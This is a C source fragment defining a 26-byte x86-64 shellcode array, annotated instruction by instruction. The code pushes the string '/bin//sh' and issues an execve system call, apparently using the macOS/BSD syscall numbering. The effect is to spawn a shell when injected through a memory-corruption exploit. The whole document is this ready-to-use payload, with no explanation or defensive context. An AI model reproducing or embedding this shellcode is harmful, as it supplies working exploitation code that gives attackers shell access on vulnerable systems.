
// Target architecture : X86 64

#define SH_SIZE 26

char SH[] = {
  /* 0000 */ "\x31\xf6"                                 /* xor     esi, esi                */
  /* 0002 */ "\xf7\xe6"                                 /* mul     esi                     */
  /* 0004 */ "\x0f\xba\xe8\x19"                         /* bts     eax, 0x19               */
  /* 0008 */ "\xb0\x3b"                                 /* mov     al, 0x3b                */
  /* 000A */ "\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68" /* movabs  rbx, 0x68732f2f6e69622f */
  /* 0014 */ "\x52"                                     /* push    rdx                     */
  /* 0015 */ "\x53"                                     /* push    rbx                     */
  /* 0016 */ "\x54"                                     /* push    rsp                     */
  /* 0017 */ "\x5f"                                     /* pop     rdi                     */
  /* 0018 */ "\x0f\x05"                                 /* syscall                         */
};